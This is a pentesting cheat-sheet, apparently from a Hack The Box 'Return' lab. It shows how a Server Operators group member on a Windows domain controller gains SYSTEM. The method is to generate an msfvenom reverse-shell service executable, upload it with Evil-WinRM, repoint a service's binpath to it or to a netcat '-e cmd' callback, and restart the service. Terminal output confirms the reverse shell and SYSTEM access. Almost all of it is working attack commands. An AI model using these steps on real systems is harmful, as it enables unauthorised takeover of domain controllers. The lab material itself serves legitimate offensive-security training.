
our user is a member of the Server Operators group (only available on DCs)

list services:
`sc.exe query`
`Get-WmiObject -Class Win32_Service | Select-Object Name, State, StartMode, PathName`

create service executable running a shell using msfvenom:
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.2 LPORT=443 -f exe-service -o revsh-win64-service-10.10.15.2-443.exe`

upload the service executable:
`upload service.exe`

listen on the port:
`nc -lnvp 443`

change the service path: (vss might not exist on your machine, use something we listed)
`sc.exe config VSS binpath="C:\users\svc-printer\desktop\revsh-win64-service-10.10.15.2-443.exe"`

or use netcat:
`sc.exe config VSS binpath="C:\windows\system32\cmd.exe /c C:\programdata\nc64.exe -e cmd 10.10.14.6 443"`

restart the service:
`Restart-Service -Name "VSS" -Force`

`whoami` - should be system

### Examples

```sh
┌──(fixit42㉿kali)-[~/shells]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.2 LPORT=443 -f exe-service -o revsh-win64-service-10.10.15.2-443.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe-service file: 48640 bytes
Saved as: revsh-win64-service-10.10.15.2-443.exe
```

```sh
*Evil-WinRM* PS C:\users\svc-printer\desktop> upload shells/revsh-win64-service-10.10.15.2-443.exe

Info: Uploading /home/fixit42/shells/revsh-win64-service-10.10.15.2-443.exe to C:\users\svc-printer\desktop\revsh-win64-service-10.10.15.2-443.exe                        


Data: 64852 bytes of 64852 bytes copied

Info: Upload successful!
```

```sh
┌──(fixit42㉿kali)-[~/boxes/htb/return]
└─$ nc -nvlp 443                                                                    
listening on [any] 443 ...

```

```sh
*Evil-WinRM* PS C:\users\svc-printer\desktop> sc.exe config VSS binpath="C:\users\svc-printer\desktop\revsh-win64-service-10.10.15.2-443.exe"
[SC] ChangeServiceConfig SUCCESS
```

```sh
┌──(fixit42㉿kali)-[~/boxes/htb/return]
└─$ nc -nvlp 443                                                                    
listening on [any] 443 ...
connect to [10.10.15.2] from (UNKNOWN) [10.129.170.211] 62158
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

